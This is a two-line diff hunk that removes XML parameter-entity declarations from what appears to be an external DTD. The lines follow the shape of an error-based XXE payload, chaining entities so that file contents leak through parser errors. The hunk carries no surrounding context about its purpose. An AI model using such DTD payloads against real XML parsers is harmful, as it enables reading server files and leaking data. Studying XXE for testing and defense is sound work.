@@ -1,2 +1,0 @@
-<!ENTITY % xxe "%start;%exploit;%end;">
-<!ENTITY % wrapper "<!ENTITY content SYSTEM '%nonExistingEntity;/%xxe;'>">
